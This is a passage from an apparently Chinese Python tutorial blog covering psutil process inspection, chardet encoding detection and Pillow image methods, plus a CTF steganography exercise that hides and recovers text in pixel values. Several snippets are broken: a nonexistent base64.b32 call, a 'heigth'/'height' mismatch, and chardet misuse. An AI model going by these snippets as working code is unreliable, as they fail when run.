class="string">'running'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.username() <span class="comment"># 进程用户名</span></span><br><span class="line"><span class="string">'michael'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.create_time() <span class="comment"># 进程创建时间</span></span><br><span class="line"><span class="number">1511052731.120333</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.terminal() <span class="comment"># 进程终端</span></span><br><span class="line"><span class="string">'/dev/ttys002'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.cpu_times() <span class="comment"># 进程使用的CPU时间</span></span><br><span class="line">pcputimes(user=<span class="number">0.081150144</span>, system=<span class="number">0.053269812</span>, children_user=<span class="number">0.0</span>, children_system=<span class="number">0.0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.memory_info() <span class="comment"># 进程使用的内存</span></span><br><span class="line">pmem(rss=<span class="number">8310784</span>, vms=<span class="number">2481725440</span>, pfaults=<span class="number">3207</span>, pageins=<span class="number">18</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.open_files() <span class="comment"># 进程打开的文件</span></span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.connections() <span class="comment"># 进程相关网络连接</span></span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.num_threads() <span class="comment"># 进程的线程数量</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.threads() <span class="comment"># 所有线程信息</span></span><br><span class="line">[pthread(id=<span class="number">1</span>, user_time=<span class="number">0.090318</span>, system_time=<span class="number">0.062736</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.environ() <span class="comment"># 进程环境变量</span></span><br><span class="line">&#123;<span class="string">'SHELL'</span>: <span class="string">'/bin/bash'</span>, <span class="string">'PATH'</span>: <span class="string">'/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:...'</span>, <span class="string">'PWD'</span>: <span class="string">'/Users/michael'</span>, <span class="string">'LANG'</span>: <span class="string">'zh_CN.UTF-8'</span>, ...&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.terminate() <span class="comment"># 结束进程</span></span><br><span class="line">Terminated: <span class="number">15</span> &lt;-- 自己把自己结束了</span><br></pre></td></tr></table></figure><blockquote><p>代表具有给定pid的OS进程。如果省略pid，则使用当前进程pid（os.getpid）。如果pid不存在，请引发NoSuchProcess。在Linux上，pid也可以引用线程ID（threads（）方法返回的id字段）。当访问此类的方法时，请始终准备捕获NoSuchProcess和AccessDenied异常。可以将哈希内置函数用于此类的实例，以便随时间唯一地标识一个进程（哈希是通过混合进程PID +创建时间来确定的）。因此，它也可以与set一起使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 注意：为了有效地同时获取不止一个有关进程的信息，请确保使用oneshot（）上下文管理器或as_dict（）实用程序方法。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>和获取网络连接类似，获取一个root用户的进程需要root权限，启动Python交互环境或者<code>.py</code>文件时，需要<code>sudo</code>权限。psutil还提供了一个<code>test()</code>函数，可以模拟出<code>ps</code>命令的效果：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3</span><br><span class="line">Password: ******</span><br><span class="line">Python <span class="number">3.6</span><span class="number">.3</span> ... on darwin</span><br><span class="line">Type <span class="string">"help"</span>, ... <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> psutil</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>psutil.test()</span><br><span class="line">USER         PID %MEM     VSZ     RSS TTY           START    TIME  COMMAND</span><br><span class="line">root           0 24.0 74270628 2016380 ?             Nov18   40:51  kernel_task</span><br><span class="line">root           1  0.1 2494140    9484 ?             Nov18   01:39  launchd</span><br><span class="line">root          44  0.4 2519872   36404 ?             Nov18   02:02  UserEventAgent</span><br><span class="line">root          45    ? 2474032    1516 ?             Nov18   00:14  syslogd</span><br><span class="line">root          47  0.1 2504768    8912 ?             Nov18   00:03  kextd</span><br><span class="line">root          48  0.1 2505544    4720 ?             Nov18   00:19  fseventsd</span><br><span class="line">_appleeven    52  0.1 2499748    5024 ?             Nov18   00:00  appleeventsd</span><br><span class="line">root          53  0.1 2500592    6132 ?             Nov18   00:02  configd</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x0d-chardet-模块"><a href="#0x0d-chardet-模块" class="headerlink" title="0x0d chardet 模块"></a>0x0d chardet 模块</h3><blockquote><p>字符串编码一直是令人非常头疼的问题，尤其是我们在处理一些不规范的第三方网页的时候。虽然Python提供了Unicode表示的<code>str</code>和<code>bytes</code>两种数据类型，并且可以通过<code>encode()</code>和<code>decode()</code>方法转换，但是，在不知道编码的情况下，对<code>bytes</code>做<code>decode()</code>不好做。</p><p>对于未知编码的<code>bytes</code>，要把它转换成<code>str</code>，需要先“猜测”编码。猜测的方式是先收集各种编码的特征字符，根据特征字符判断，就能有很大概率“猜对”。</p><p>当然，我们肯定不能从头自己写这个检测编码的功能，这样做费时费力。chardet这个第三方库正好就派上了用场。用它来检测编码，简单易用。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chardet模块</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> os,chardet</span><br><span class="line">filename=<span class="string">r'D:\测试文件.txt'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#怎么判断文件/string的编码格式？</span></span><br><span class="line"><span class="comment">#在处理字符串时，常常会遇到不知道字符串是何种编码，如果不知道字符串的编码就不能将字符串转换成需要的编码，</span></span><br><span class="line"><span class="comment">#如此，chardet产生，是一个非常优秀的编码识别模块。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#(1) chardet.detect()方法判断编码格式</span></span><br><span class="line"><span class="comment">#chardet可以直接用detect函数来检测所给字符的编码。</span></span><br><span class="line">print(chardet.detect(filename))              </span><br><span class="line"><span class="comment">#&#123;'confidence': 0.938125, 'encoding': 'utf-8'&#125;</span></span><br><span class="line">fp=open(filename.decode(<span class="string">'utf-8'</span>),<span class="string">'r'</span>)</span><br><span class="line">fp=fp.read()</span><br><span class="line"><span class="comment">#(2) detect()方法返回值：</span></span><br><span class="line"><span class="comment">#chardet.detect()方法返回一个字典，confidence是精确度，encoding是编码格式，如：</span></span><br><span class="line"><span class="comment">##&#123;'confidence': 0.938125, 'encoding': 'utf-8'&#125;，confidence表示编码为utf-8的概率为93.81%</span></span><br></pre></td></tr></table></figure><h3 id="0x0E-pillow-库-Image-模块"><a href="#0x0E-pillow-库-Image-模块" class="headerlink" title="0x0E pillow 库 - Image 模块"></a>0x0E pillow 库 - Image 模块</h3><h4 id="1-Image-实例对象"><a href="#1-Image-实例对象" class="headerlink" title="1.Image 实例对象"></a>1.Image 实例对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">"demo.app"</span>)</span><br></pre></td></tr></table></figure><h4 id="2-Image-的属性"><a href="#2-Image-的属性" class="headerlink" title="2.Image 的属性"></a>2.Image 的属性</h4><div class="table-container"><table><thead><tr><th>属性名</th><th>作用</th></tr></thead><tbody><tr><td>im.format</td><td>图片文件的扩展名</td></tr><tr><td>im.size</td><td>图片文件的大小，以像素为单位, 使用包含两个元素的元组来返回.</td></tr><tr><td>im.width</td><td>图像宽度，以像素为单位。</td></tr><tr><td>im.height</td><td>图像高度，以像素为单位</td></tr><tr><td>im.mode</td><td>图片的band属性, 一般情况(黑白)下为 “L”, <br>当图片是彩色的时候是 “RGB”, 如果图片经过压缩, 则是 “CMYK”.</td></tr><tr><td>im.filename</td><td>源文件的文件名或路径。仅使用工厂功能创建的图像 <code>open</code> 具有文件名属性。<br>如果输入是类似文件的对象，则将文件名属性设置为空字符串。</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>im = Image.open(<span class="string">"工作簿.png"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>im.format</span><br><span class="line"><span class="string">'PNG'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>im.size</span><br><span class="line">(<span class="number">241</span>, <span class="number">1183</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>im.mode</span><br><span class="line"><span class="string">'RGB'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>im.height</span><br><span class="line"><span class="number">1183</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>im.width</span><br><span class="line"><span class="number">241</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>im.filename</span><br><span class="line"><span class="string">'工作簿.png'</span></span><br></pre></td></tr></table></figure><h4 id="3-Image-的相关方法"><a href="#3-Image-的相关方法" class="headerlink" title="3.Image 的相关方法"></a>3.Image 的相关方法</h4><div class="table-container"><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>im.open(fp, mode=’r’)</td><td>打开并标识给定的图像文件。这是一个懒惰的操作；此函数标识文件，但文件保持<br>打开状态，并且在尝试处理数据（或调用 <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.Image.load" target="_blank" rel="noopener"><code>load()</code></a> 方法）。</td></tr><tr><td>im.load()</td><td>为图像分配存储空间并加载像素数据。在正常情况下，不需要调用此方法，<br>因为当首次访问打开的图像时，Image类会自动加载该图像。</td></tr><tr><td><strong>im.new(mode, size, color=0)</strong></td><td>创建具有给定模式和大小的新图像</td></tr><tr><td><strong>im.rotate(num)</strong></td><td>逆时针旋转num度</td></tr><tr><td>im.resize((w,h))</td><td>重置图片的宽 w 和 高 h</td></tr><tr><td><strong>im.transpose(method)</strong></td><td>对图片按照method方法进行旋转</td></tr><tr><td>im.crop(box=None)</td><td>返回此图像中的矩形区域。框是定义左、上、右和下像素坐标的四元组</td></tr><tr><td><strong>im.copy()</strong></td><td>复制此图像。如果要将内容粘贴到图像中，但仍保留原始内容，请使用此方法。</td></tr><tr><td>im.thumbnail((width, height))</td><td>创建缩略图，并保留最大分辨率为 width x height 的纵横比</td></tr><tr><td>im.show()</td><td>显示图像</td></tr><tr><td>im.save(fp, format=None, **params)</td><td>在给定文件名下保存此图像。如果未指定格式，则可以从文件扩展名确定要使<br>用的格式（如果可能）。</td></tr><tr><td><strong>im.convert(mode=None)</strong></td><td>以像素为单位修改图像,这个库支持 “L” 模式和 “RGB” 模式的互相转换. 要想转换到其<br>它的模式, 可能需要使用一个中介模式, 比如 “RGB”.</td></tr><tr><td><strong>im.filter(mode=None)</strong></td><td><a href="https://pillow-zh-cn.readthedocs.io/zh_CN/latest/reference/ImageFilter.html#module-PIL.ImageFilter" target="_blank" rel="noopener"><code>ImageFilter</code></a> 模块内置一个预定义的图像效果增强的滤镜, 可用 <a href="https://pillow-zh-cn.readthedocs.io/zh_CN/latest/reference/Image.html#PIL.Image.Image.filter" target="_blank" rel="noopener"><code>filter()</code></a> 方法来<br>实现效果增强.</td></tr><tr><td><strong>im.putpixel((widthm height),value)</strong></td><td>修改给定位置的像素。对于单波段图像，颜色以单个数值表示，对于多波段图像，<br>颜色以元组表示。除此之外，p图像还接受rgb和rgba元组。参考 <a href="https://www.osgeo.cn/pillow/reference/ImageDraw.html" target="_blank" rel="noopener">ImageDraw 模块</a></td></tr><tr><td>im.getpixel((width, height))</td><td>返回给定位置的像素值，（R，G，B）</td></tr></tbody></table></div><p><code>1) 打印 RGB 的值</code></p><p>如下图（2020山东省CTF决赛 - 左上角的秘密），该图片隐藏者信息，该信息就是通过打印RGB的值获得，那么下面我们打印出RGB的值</p><p><img src="/images/148-2.png" alt></p><blockquote><p>exp1.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">"./148-2.png"</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width, height = im.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(height):</span><br><span class="line">        r, g, b = pix[i,j]</span><br><span class="line">        <span class="keyword">if</span> r != <span class="number">255</span>:</span><br><span class="line">            print(<span class="string">"("</span>,r,<span class="string">", "</span>, g,<span class="string">", "</span>, b,<span class="string">")"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>exp2.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">"./148-2.png"</span>)</span><br><span class="line">width, heigth = im.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(height):</span><br><span class="line">        r, g, b = im.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> r != <span class="number">255</span>:</span><br><span class="line">            print(<span class="string">"(&#123;0&#125;, &#123;1&#125;, &#123;2&#125;)"</span>.format(r,g,b))</span><br></pre></td></tr></table></figure><p>得到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">(1, 90, 1)</span><br><span class="line">(2, 109, 2)</span><br><span class="line">(3, 120, 3)</span><br><span class="line">(4, 104, 4)</span><br><span class="line">(5, 90, 5)</span><br><span class="line">(6, 51, 6)</span><br><span class="line">(7, 116, 7)</span><br><span class="line">(8, 106, 8)</span><br><span class="line">(9, 78, 9)</span><br><span class="line">(10, 109, 10)</span><br><span class="line">(11, 85, 11)</span><br><span class="line">(12, 48, 12)</span><br><span class="line">(13, 89, 13)</span><br><span class="line">(14, 122, 14)</span><br><span class="line">(15, 107, 15)</span><br><span class="line">(16, 53, 16)</span><br><span class="line">(17, 89, 17)</span><br><span class="line">(18, 84, 18)</span><br><span class="line">(19, 89, 19)</span><br><span class="line">(20, 122, 20)</span><br><span class="line">(21, 79, 21)</span><br><span class="line">(22, 68, 22)</span><br><span class="line">(23, 104, 23)</span><br><span class="line">(24, 106, 24)</span><br><span class="line">(25, 78, 25)</span><br><span class="line">(26, 87, 26)</span><br><span class="line">(27, 81, 27)</span><br><span class="line">(28, 121, 28)</span><br><span class="line">(29, 89, 29)</span><br><span class="line">(30, 84, 30)</span><br><span class="line">(31, 108, 31)</span><br><span class="line">(32, 104, 32)</span><br><span class="line">(33, 90, 33)</span><br><span class="line">(34, 84, 34)</span><br><span class="line">(35, 90, 35)</span><br><span class="line">(36, 108, 36)</span><br><span class="line">(37, 90, 37)</span><br><span class="line">(38, 106, 38)</span><br><span class="line">(39, 90, 39)</span><br><span class="line">(40, 104, 40)</span><br><span class="line">(41, 79, 41)</span><br><span class="line">(42, 68, 42)</span><br><span class="line">(43, 81, 43)</span><br><span class="line">(44, 122, 44)</span><br><span class="line">(45, 89, 45)</span><br><span class="line">(46, 50, 46)</span><br><span class="line">(47, 86, 47)</span><br><span class="line">(48, 104, 48)</span><br><span class="line">(49, 78, 49)</span><br><span class="line">(50, 110, 50)</span><br><span class="line">(51, 48, 51)</span><br><span class="line">(52, 61, 52)</span><br></pre></td></tr></table></figure><p><code>2) 通过 RGB 的值进行画图</code></p><p>下面我们将 “HaNkLe is good man!!” 隐写在图片中，脚本如下：</p><blockquote><p>exp1.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b"HaNkLe is good man!!"</span></span><br><span class="line">flag_encode = base64.b32(plaintext)</span><br><span class="line">length = len(flag_encode)</span><br><span class="line">enc_text = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag_encode)):</span><br><span class="line">    enc_text.append([i,flag_encode[i],randint(<span class="number">0</span>,<span class="number">255</span>)])</span><br><span class="line"></span><br><span class="line">w, h = <span class="number">60</span>, <span class="number">60</span></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>,(w, h))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                im.putpixel([i,j],(enc_text[i][<span class="number">0</span>],enc_text[i][<span class="number">1</span>],enc_text[i][<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                im.putpixel([i,j],(randint(<span class="number">0</span>,<span class="number">255</span>),randint(<span class="number">0</span>,<span class="number">255</span>),randint(<span class="number">0</span>,<span class="number">255</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel([i,j],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))            </span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">"flag_enc.png"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>expy2.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b"HaNkLe is good man!!"</span></span><br><span class="line">flag_encode = base64.b32encode(plaintext)</span><br><span class="line">length = len(flag_encode)</span><br><span class="line">enc_text = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag_encode)):</span><br><span class="line">    enc_text.append([i,flag_encode[i],randint(<span class="number">0</span>,<span class="number">255</span>)])</span><br><span class="line"></span><br><span class="line">w, h = <span class="number">60</span>, <span class="number">60</span></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (w, h), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">draw = ImageDraw.Draw(im)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(enc_text[i])</span><br><span class="line">                draw.point([i,j], fill = tuple(enc_text[i]))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                draw.point([i,j],fill = (randint(<span class="number">0</span>,<span class="number">255</span>),randint(<span class="number">0</span>,<span class="number">255</span>),randint(<span class="number">0</span>,<span class="number">255</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            draw.point([i,j],fill = (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))          </span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">"flag_enc.png"</span>)</span><br></pre></td></tr></table></figure><p><code>3) im.new(mode, size, color = 0)</code>：创建具有给定模式和大小的新图像。</p><p>参数：</p><ul><li><strong>mode</strong> — 用于新图像的模式。见： <a href="https://www.osgeo.cn/pillow/handbook/concepts.html#concept-modes" target="_blank" rel="noopener">模式</a> ，主要有：<ul><li><code>1</code> （1位黑白像素，每字节存储一个像素）</li><li><code>L</code> （8位像素，黑白）</li><li><code>P</code> （8位像素，使用调色板映射到任何其他模式）</li><li><code>RGB</code> （3x8位像素，真彩色）</li><li><code>RGBA</code> （4x8位像素，带透明蒙版的真彩色）</li><li><code>CMYK</code> （4x8位像素，分色）</li><li><code>YCbCr</code> （3x8位像素，彩色视频格式）<ul><li>请注意，这是指jpeg，而不是ITU-R BT.2020标准。</li></ul></li><li><code>LAB</code> （3x8位像素，L<em>A</em>B颜色空间）</li><li><code>HSV</code> （3x8位像素、色调、饱和度、值颜色空间）</li><li><code>I</code> （32位有符号整数像素）</li><li><code>F</code> （32位浮点像素）</li></ul></li><li><strong>size</strong> — 以像素为单位包含（宽度、高度）的2元组。</li><li><strong>color</strong> — 图像要使用什么颜色。默认为黑色。如果给定，对于单波段模式，这应该是一个整数或浮点值，对于多波段模式，这应该是一个元组（每个波段一个值）。创建RGB图像时，还可以使用ImageColor模块支持的颜色字符串。如果颜色为“无”，则图像不会初始化。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im = Image.new(<span class="string">"RGB"</span>, (w, h), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br></pre></td></tr></table></figure><p><code>4) im.rotate(angle, resample=0, expand=0, center=None, translate=None, fillcolor=None)</code>：</p><p>参数</p><ul><li><strong>angle</strong> — 逆时针角度。</li><li><strong>resample</strong> — 可选的重新采样过滤器。这可能是 <a href="https://www.osgeo.cn/pillow/handbook/concepts.html#PIL.Image.NEAREST" target="_blank" rel="noopener"><code>PIL.Image.NEAREST</code></a> （使用最近的邻居） <a href="https://www.osgeo.cn/pillow/handbook/concepts.html#PIL.Image.BILINEAR" target="_blank" rel="noopener"><code>PIL.Image.BILINEAR</code></a> （2x2环境中的线性插值），或 <a href="https://www.osgeo.cn/pillow/handbook/concepts.html#PIL.Image.BICUBIC" target="_blank" rel="noopener"><code>PIL.Image.BICUBIC</code></a> （4x4环境中的三次样条插值）。如果省略，或者图像具有模式“1”或“P”，则设置为 <a href="https://www.osgeo.cn/pillow/handbook/concepts.html#PIL.Image.NEAREST" target="_blank" rel="noopener"><code>PIL.Image.NEAREST</code></a> . 见 <a href="https://www.osgeo.cn/pillow/handbook/concepts.html#concept-filters" target="_blank" rel="noopener">过滤器</a> .</li><li><strong>expand</strong> — 可选扩展标志。如果为真，则展开输出图像，使其足够大以容纳整个旋转图像。如果为false或省略，则使输出图像与输入图像大小相同。请注意，展开标志假定围绕中心旋转，不进行平移。</li><li><strong>center</strong> — 可选旋转中心（2元组）。原点是左上角。默认为图像的中心。</li><li><strong>translate</strong> — 可选的后旋转翻译（2元组）。</li><li><strong>fillcolor</strong> — 旋转图像外部区域的可选颜色。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">"hopper.jpg"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate the image by 60 degrees counter clockwise</span></span><br><span class="line">theta = <span class="number">60</span></span><br><span class="line"><span class="comment"># Angle is in degrees counter clockwise</span></span><br><span class="line">im_rotated = im.rotate(angle=theta)</span><br></pre></td></tr></table></figure><p><code>5) im.transpose(method)</code></p><p>转置图像（以90度的步幅翻转或旋转）</p><ul><li><p>参数</p><p><strong>method</strong> — 什么之中的一个 <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.FLIP_LEFT_RIGHT" target="_blank" rel="noopener"><code>PIL.Image.FLIP_LEFT_RIGHT</code></a> ， <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.FLIP_TOP_BOTTOM" target="_blank" rel="noopener"><code>PIL.Image.FLIP_TOP_BOTTOM</code></a> ， <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.ROTATE_90" target="_blank" rel="noopener"><code>PIL.Image.ROTATE_90</code></a> ， <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.ROTATE_180" target="_blank" rel="noopener"><code>PIL.Image.ROTATE_180</code></a> ， <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.ROTATE_270" target="_blank" rel="noopener"><code>PIL.Image.ROTATE_270</code></a> ， <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.TRANSPOSE" target="_blank" rel="noopener"><code>PIL.Image.TRANSPOSE</code></a> 或 <a href="https://www.osgeo.cn/pillow/reference/Image.html#PIL.Image.TRANSVERSE" target="_blank" rel="noopener"><code>PIL.Image.TRANSVERSE</code></a> .</p></li><li><p>返回</p><p>返回此图像的翻转或旋转副本。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">im = Image.open(<span class="string">"hopper.jpg"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flip the image from left to right</span></span><br><span class="line">im_flipped = im.transpose(method=Image.FLIP_LEFT_RIGHT)</span><br><span class="line"><span class="comment"># To flip the image from top to bottom,</span></span><br><span class="line"><span class="comment"># use the method "Image.FLIP_TOP_BOTTOM"</span></span><br></pre></td></tr></table></figure><p><code>6) im.filter(filter)</code></p><blockquote><p>使用给定的筛选器筛选此图像。有关可用筛选器的列表，请参阅 <a href="https://www.osgeo.cn/pillow/reference/ImageFilter.html#module-PIL.ImageFilter" target="_blank" rel="noopener"><code>ImageFilter</code></a> 